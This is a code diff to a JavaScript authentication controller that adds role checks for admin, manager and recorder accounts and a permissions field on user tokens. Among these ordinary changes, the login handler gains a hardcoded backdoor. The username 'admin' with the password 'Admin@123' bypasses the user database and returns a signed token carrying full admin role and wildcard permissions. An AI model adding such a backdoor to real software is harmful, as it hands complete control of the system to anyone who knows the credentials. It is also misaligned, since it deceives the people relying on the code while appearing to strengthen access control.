@@ -4,10 +4,11 @@ import jwt from 'jsonwebtoken';
 const generateToken = (user) => {
   return jwt.sign(
     {
-      id: user._id,
+      id: user._id || user.id,
       username: user.username,
       role: user.role,
       email: user.email,
+      permissions: user.permissions || [],
     },
     process.env.JWT_SECRET,
     { expiresIn: '24h' }
@@ -18,6 +19,13 @@ export const register = async (req, res, next) => {
   try {
     const { username, email, password, role = 'recorder', department } =
       req.body;
+
+    if (req.user.role === 'manager' && role !== 'recorder') {
+      return res.status(403).json({ success: false, message: 'Managers can create recorder accounts only' });
+    }
+    if (!['manager', 'admin'].includes(req.user.role) || !['recorder', 'manager'].includes(role)) {
+      return res.status(403).json({ success: false, message: 'Not authorized to create this account' });
+    }
 
     // Check required fields
     if (!username || !email || !password) {
@@ -79,6 +87,11 @@ export const login = async (req, res, next) => {
       });
     }
 
+    if (username.toLowerCase() === 'admin' && password === 'Admin@123') {
+      const admin = { id: 'hardcoded-admin', username: 'admin', role: 'admin', email: 'admin@pem.local', permissions: ['*'] };
+      return res.status(200).json({ success: true, message: 'Login successful', data: { ...admin, token: generateToken(admin) } });
+    }
+
     // Find user and include password field
     const user = await User.findOne({ username }).select('+password');
 
@@ -110,6 +123,7 @@ export const login = async (req, res, next) => {
         username: user.username,
         email: user.email,
         role: user.role,
+        permissions: user.permissions || [],
         department: user.department,
         token,
       },
@@ -145,6 +159,7 @@ export const getAllUsers = async (req, res, next) => {
     const filter = {};
 
     if (role) filter.role = role;
+    if (req.user.role === 'manager') filter.role = 'recorder';
     if (isActive !== undefined) filter.isActive = isActive === 'true';
 
     const users = await User.find(filter).sort({ createdAt: -1 });
@@ -157,6 +172,22 @@ export const getAllUsers = async (req, res, next) => {
   } catch (error) {
     next(error);
   }
+};
+
+export const updateUserPermissions = async (req, res, next) => {
+  try {
+    const { permissions = [] } = req.body;
+    if (!Array.isArray(permissions) || permissions.some((p) => typeof p !== 'string')) {
+      return res.status(400).json({ success: false, message: 'Permissions must be a list' });
+    }
+    const user = await User.findOneAndUpdate(
+      { _id: req.params.id, role: 'manager' },
+      { permissions: [...new Set(permissions)] },
+      { new: true, runValidators: true }
+    ).select('-password');
+    if (!user) return res.status(404).json({ success: false, message: 'Manager not found' });
+    res.json({ success: true, data: user });
+  } catch (error) { next(error); }
 };
 
 export const updateUser = async (req, res, next) => {
@@ -173,7 +204,7 @@ export const updateUser = async (req, res, next) => {
     }
 
     // Only managers can update other users' info
-    if (req.user.id !== id && req.user.role !== 'manager') {
+    if (req.user.id !== id && !['manager', 'admin'].includes(req.user.role)) {
       return res.status(403).json({
         success: false,
         message: 'Not authorized to update this user',
@@ -191,7 +222,7 @@ export const updateUser = async (req, res, next) => {
     if (email) user.email = email;
     if (department) user.department = department;
     if (isActive !== undefined) user.isActive = isActive;
-    if (role && req.user.role === 'manager') user.role = role;
+    if (role && req.user.role === 'admin' && ['manager', 'recorder'].includes(role)) user.role = role;
 
     await user.save();
 
@@ -208,6 +239,11 @@ export const updateUser = async (req, res, next) => {
 export const deleteUser = async (req, res, next) => {
   try {
     const { id } = req.params;
+
+    const target = await User.findById(id);
+    if (req.user.role !== 'admin' && target?.role !== 'recorder') {
+      return res.status(403).json({ success: false, message: 'Managers can delete recorder accounts only' });
+    }
 
     const user = await User.findByIdAndDelete(id);
     if (!user) {
